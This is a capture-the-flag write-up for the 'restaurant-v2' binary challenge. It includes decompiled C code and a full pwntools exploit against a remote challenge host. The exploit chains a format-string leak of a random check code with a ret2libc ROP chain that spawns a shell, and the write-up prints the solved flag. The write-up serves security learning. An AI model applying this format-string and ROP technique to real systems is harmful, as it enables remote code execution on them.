## Challenge Description

Maybe you can get a free menu!!

Flag format: CTF{sha256}

### Intuition

Checksec the binary to see what we have.

```  
$ checksec restaurant-v2  
LIBC_FILE=/lib/x86_64-linux-gnu/libc.so.6  
RELRO           STACK CANARY      NX            PIE             RPATH
RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE  
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No
RUNPATH   82 Symbols        No    0               4
restaurant-v2  
```  
It's the same binary as in ``bistro``, but with an added function that checks
a "code". Let's check it:

```c  
int main(int argc,char **argv)  
{  
 int iVar1;  
 ssize_t sVar2;  
 undefined4 in_register_0000003c;  
 char **argv-local;  
 int argc-local;  
 int not_flag;  
 int flag;  
 int fd;  
  
 init((EVP_PKEY_CTX *)CONCAT44(in_register_0000003c,argc));  
 fd = open("/dev/urandom",0);  
 if (fd == -1) {  
   puts("Open failed");  
   iVar1 = -1;  
 }  
 else {  
   sVar2 = read(fd,&flag,4);  
   if (sVar2 == 4) {  
     close(fd);  
     puts("Wellcome to the restaurant V2!");  
     fflush(stdout);  
     fgets(buff,0x400,stdin);  
     printf(buff);  
     puts("Show me your ticket to pass: ");  
     fflush(stdout);  
     __isoc99_scanf("%x",&not_flag);  
     if (flag == not_flag) {  
       restaurant();  
     }  
     else {  
       puts("Permission denied!\n");  
     }  
     iVar1 = 0;  
   }  
   else {  
     puts("Read failed\n");  
     iVar1 = -1;  
   }  
 }  
 return iVar1;  
}  
```  
So we just need to leak it with the vulnerable printf and write it correctly
to pass the check. Then we run the same script as before but with some
addresses changed.

### Solution

```py  
#!/usr/bin/env python3

from pwn import *

#target = process("./restaurant")  
target = remote("34.107.4.232", 31399)

# Found with ROPGadget  
pop_rdi = p64(0x0000000000400b33)  
ret = p64(0x00000000004006ae) # align stack to 16-bytes again for system call

# Found in the binary  
main_addr = p64(0x0040088a)  
puts_plt = p64(0x004006c0)  
puts_got = p64(0x00602018)

# Leak the real code  
target.sendline(b"%9$x")  
code_leak = target.recvuntil(b"Show me your ticket to pass: ").split(b'\n')[1]

# Send it when the binary asks for the ticket  
print(code_leak)  
target.sendline(code_leak)

# Same exploit as in bistro, check that writeup  
target.sendline(b"3")  
payload = b"a" * 0x78 + pop_rdi + puts_got + puts_plt + main_addr # go back to
main for more inputs  
target.sendline(payload)  
print(target.recvuntil(b">>"))  
print(target.recvline())  
puts_leak = u64(target.recvline().strip().split(b':')[1].ljust(8, b'\x00'))  
print(puts_leak)  
print(hex(puts_leak))

system_addr = p64(puts_leak - 202064)  
print(system_addr)

sh_addr = p64(puts_leak + 0x133418)

payload = b"a" * 0x78 + ret + pop_rdi + sh_addr + system_addr

target.sendline(payload)  
target.interactive()  
```

#### Flag

```CTF{04134a331cd5bed41dc418c04854ac3fd7e03148f0e61d74d61508f19b7c5933}```  

Original writeup (https://dothidden.xyz/defcamp_quals_2023/bistro-v2/).